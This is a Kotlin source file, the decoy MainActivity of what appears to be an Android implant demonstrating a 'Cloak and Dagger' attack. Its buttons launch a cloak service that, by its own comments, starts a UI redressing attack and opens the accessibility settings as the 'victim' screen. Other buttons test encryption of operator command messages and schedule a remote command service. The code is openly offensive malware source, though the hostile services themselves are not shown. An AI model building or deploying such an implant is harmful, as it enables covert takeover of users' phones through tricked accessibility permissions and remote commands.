package com.cooperthecoder.implant.decoy

import android.app.Activity
import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.support.v7.app.AppCompatActivity
import android.util.Log
import com.cooperthecoder.implant.Config
import com.cooperthecoder.implant.R
import com.cooperthecoder.implant.cloak.CloakService
import com.cooperthecoder.implant.command.CommandService
import com.cooperthecoder.implant.command.jobs.StartCommandServiceJob
import com.cooperthecoder.implant.crypto.Base64KeyPair
import com.cooperthecoder.implant.crypto.NetworkEncryption
import com.cooperthecoder.implant.dagger.DaggerService
import com.cooperthecoder.implant.data.SharedPreferencesQuery


class MainActivity : AppCompatActivity() {

    companion object {
        val TAG = MainActivity::class.java.name
    }

    private val REQUEST_CODE_OVERLAY = 5463

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        val cloakAndDaggerBtn = findViewById(R.id.btn_cloak_and_dagger_demo)
        val encryptionTestBtn = findViewById(R.id.btn_encryption_demo)
        val commandServiceTestBtn = findViewById(R.id.btn_command_service)
        cloakAndDaggerBtn.setOnClickListener {
            if (!overlayPermissionRequired()) {
                startCloakService()
            }
        }

        encryptionTestBtn.setOnClickListener {
            startEncryptionTest()
        }

        commandServiceTestBtn.setOnClickListener {
            startCommandService()
        }

        if (SharedPreferencesQuery.commandJobIsScheduled(this)) {
            StartCommandServiceJob.schedule()
            SharedPreferencesQuery.scheduleCommandJob(this)
        }
    }

    private fun startEncryptionTest() {
        val message = "{\"command\":\"pin\",\"nonce\":\"3e7376be-9a10-46a9-b0aa-3f1174aabfb0\",\"arguments\":{}}"
        val keypair = Base64KeyPair(SharedPreferencesQuery.getPrivateKey(this))
        val ne = NetworkEncryption(Config.OPERATOR_PUBLIC_KEY, keypair.privateKeyBase64())
        val ciphertext = ne.encrypt(message)
        Log.d(TAG, "Ciphertext: $ciphertext")
        val plaintext = ne.decrypt(ciphertext)
        Log.d(TAG, "Plaintext: $plaintext")
    }

    override fun onResume() {
        super.onResume()
    }

    private fun startCommandService() {
        startService(CommandService.intent(this))
    }

    private fun startCloakService() {
        // No need for the cloak if the dagger already came out
        if (!DaggerService.isRunning()) {
            // Start the cloak service to begin the UI redressing attack
            startService(Intent(this, CloakService::class.java))
            // Launch victim settings activity and close this activity.
            val flags = Intent.FLAG_ACTIVITY_NEW_TASK or
                    Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS
            startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
                    .setFlags(flags))
            finish()
        }
    }

    private fun overlayPermissionRequired() = Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        if (requestCode == REQUEST_CODE_OVERLAY && resultCode == Activity.RESULT_OK && !overlayPermissionRequired()) {
            startCloakService()
        }
    }
}
